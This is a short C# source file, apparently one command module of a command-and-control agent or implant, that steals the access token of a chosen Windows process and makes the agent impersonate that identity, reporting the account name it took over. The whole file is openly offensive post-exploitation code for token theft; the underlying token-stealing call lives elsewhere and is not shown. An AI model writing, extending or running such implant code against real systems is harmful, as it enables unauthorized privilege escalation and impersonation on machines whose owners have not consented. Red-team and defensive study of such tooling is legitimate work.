using Agent.Commands;
using Agent.Helpers;
using Agent.Models;
using Shared;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using WinAPI;
using WinAPI.Wrapper;

namespace Commands
{
    public class StealTokenCommand : AgentCommand
    {
        public override CommandId Command => CommandId.StealToken;
        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {
            task.ThrowIfParameterMissing(ParameterId.Id);
  
            var processId = task.GetParameter<int>(ParameterId.Id);
            var hToken = APIWrapper.StealToken(processId);

            context.Agent.ImpersonationToken = hToken;
            var identity = new WindowsIdentity(hToken);
            context.AppendResult($"Successfully impersonate token {identity.Name}");
        }
    }
}
